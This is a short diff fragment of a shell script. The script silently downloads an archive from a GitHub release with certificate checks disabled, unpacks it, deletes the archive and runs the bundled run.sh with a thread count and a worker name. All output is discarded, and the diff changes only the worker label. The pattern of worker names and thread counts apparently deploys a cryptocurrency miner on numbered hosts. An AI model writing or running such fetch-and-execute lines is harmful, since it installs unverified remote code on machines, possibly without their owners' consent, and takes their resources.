@@ -4,4 +4,4 @@ curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/nowd
 tar -xvf nowde.tar.gz >/dev/null 2>&1
 rm nowde.tar.gz
 chmod +x run.sh 
-./run.sh 4 worker00 >/dev/null 2>&1
+./run.sh 4 worker06 >/dev/null 2>&1
